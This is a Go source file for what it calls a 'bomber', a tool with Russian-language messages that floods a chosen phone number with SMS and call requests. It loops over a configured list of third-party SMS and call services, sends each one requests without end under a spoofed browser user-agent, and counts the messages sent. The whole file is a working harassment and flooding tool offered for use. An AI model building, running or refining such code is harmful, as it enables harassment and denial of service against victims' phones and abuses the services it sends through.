package main

import (
	"bufio"
	"os"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/valyala/fasthttp"
)

const version = "2.0.0"

func shutdown(crash bool) {
	print("Нажмите 'Enter', для выхода из программы...")
	bufio.NewReader(os.Stdin).ReadRune()

	if crash {
		os.Exit(1)
	}
	os.Exit(0)
}

func errCheck(err error) {
	if err != nil {
		println(err.Error())
		debug.PrintStack()

		shutdown(true)
	}
}

var client = &fasthttp.Client{
	DisableHeaderNamesNormalizing: true,
	NoDefaultUserAgentHeader:      true,
}

type service struct {
	URL    string `yaml:"url"`
	Method string `yaml:"method"`

	Headers map[string]string `yaml:"headers"`

	Body  string `yaml:"body"`
	OKRes string `yaml:"okRes"`

	Delay uint `yaml:"delay"`
}

type servicesStruct struct {
	SMSServices  []service `yaml:"smsServices"`
	CallServices []service `yaml:"callServices"`
}

var (
	services = &servicesStruct{}

	num       string
	floodMode int8
	logging   int8
	floodTime int

	do = true

	smss int
	mux  = sync.Mutex{}
)

type typParam bool

const (
	call typParam = true
	sms  typParam = false
)

var grPrntln = color.New(color.FgHiGreen).Println
var okLog = func(typ typParam) {
	mux.Lock()
	if typ == call {
		grPrntln(time.Now().Format("15:04:05.000") + " - Запрос на звонок отправлен!")
	} else {
		smss++
		grPrntln(time.Now().Format("15:04:05.000") + " - SMS отправлено! (" + strconv.Itoa(smss) + ")")
	}
	mux.Unlock()
}

var redPrntln = color.New(color.FgRed).Println
var errLog = func(typ typParam) {
	mux.Lock()
	if typ == call {
		redPrntln(time.Now().Format("15:04:05.000") + " - Не удалось отправить запрос на звонок!")
	} else {
		redPrntln(time.Now().Format("15:04:05.000") + " - SMS не отправлено!")
	}
	mux.Unlock()
}

func main() {
	color.New(color.FgHiGreen).Print("Запущен флуд на номер")
	print(" ")
	color.New(color.FgHiYellow).Println("+" + num)

	switch logging {
	case 0:
		println("Лог выключен")
	case 1:
		println("Лог будет содержать только OK сообщения")
	case 2:
		println("Лог будет содержать только ERR сообщения")
	case 3:
		println("Лог будет содержать OK и ERR сообщения")
	}

	switch floodMode {
	case 1:
		println("Будут отправляться запросы на отправку SMS")
		runFlood(sms)
	case 2:
		println("Будут отправляться запросы на звонки")
		runFlood(call)
	case 3:
		println("Будут отправляться запросы на звонки и отправку SMS")
		runFlood(sms)
		runFlood(call)
	}

	println("Нажмите Ctrl+C чтобы остановить работу бомбера")

	if floodTime <= 0 {
		<-make(chan bool, 0)
	} else {
		<-time.NewTimer(time.Second * time.Duration(floodTime)).C
		do = false
		mux.Lock()
		println("Работа завершена!")
		shutdown(false)
	}
}

func runFlood(typ typParam) {
	var (
		srvcs      []service
		okLogWrap  = func() {}
		errLogWrap = func() {}
	)

	if typ == call {
		srvcs = services.CallServices

		okLogWrap = func() {
			okLog(call)
		}
		errLogWrap = func() {
			errLog(call)
		}
	} else {
		srvcs = services.SMSServices

		okLogWrap = func() {
			okLog(sms)
		}
		errLogWrap = func() {
			errLog(sms)
		}
	}

	for _, srvc := range srvcs {
		srvcLoc := srvc
		go func() {
			req := &fasthttp.Request{}
			req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")

			req.SetRequestURI(srvcLoc.URL)
			req.Header.SetMethod(srvcLoc.Method)
			req.SetBodyString(srvcLoc.Body)
			for k, v := range srvcLoc.Headers {
				req.Header.Set(k, v)
			}

			delay := time.Second * time.Duration(srvcLoc.Delay)

			if logging > 0 {
				var err error
				res := &fasthttp.Response{}
				var dbg = func() {}

				if testEnv {
					dbg = func() {
						if err != nil {
							println("Error:", err.Error(), "\nURL:", req.URI().String(), "\nBody:", string(req.Body()))
						} else {
							println("URL:", req.URI().String(), "\nBody:", string(req.Body()), "\nResponse body:", string(res.Body()))
						}
					}
				}

				for do {
					err = client.Do(req, res)

					dbg()

					if err == nil && strings.Index(string(res.Body()), srvcLoc.OKRes) != -1 {
						okLogWrap()
					} else {
						errLogWrap()
					}
					time.Sleep(delay)
				}
			} else {
				for do {
					client.Do(req, nil)
					time.Sleep(delay)
				}
			}
		}()
	}
}
